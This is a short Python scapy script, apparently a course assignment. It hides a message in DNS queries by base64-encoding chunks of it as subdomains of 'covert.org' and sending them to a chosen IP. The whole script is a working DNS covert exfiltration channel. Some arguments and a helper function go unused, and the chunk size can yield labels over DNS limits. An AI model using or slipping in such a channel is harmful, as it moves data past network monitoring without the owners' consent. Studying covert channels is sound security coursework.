#!/bin/python3
from scapy.all import *
from scapy.layers.http import *
import base64
import argparse

parser=argparse.ArgumentParser(description='Pass args to Assignment 1')
parser.add_argument('sourceIP', metavar="sourceIP", type=str, help="Source IP")
parser.add_argument('destinationIP', metavar="destinationIP", type=str, help="Destination IP")
parser.add_argument('plaintext', metavar="plaintext", type=str, help="Covert message")
parser.add_argument('--dport', metavar="destinationPort", type=int, default=4443, help="Destination port (default 4443)")

def encodeText(plaintext):
    return ord(plaintext) * 16777216


def main():
    
    args = parser.parse_args()
    print( args )
    suffix = ".covert.org"

    n=63-len(suffix)
    chunks = [args.plaintext[i:i+n] for i in range(0, len(args.plaintext), n)]
    for element in chunks:
        url = (base64.b64encode(element.encode("utf-8")).decode()) + suffix
        send(IP(dst=args.destinationIP)/UDP(sport=RandShort(), dport=53)/DNS(rd=1, qd=DNSQR(qname=url,qtype="A")))

if __name__ == "__main__":
    main()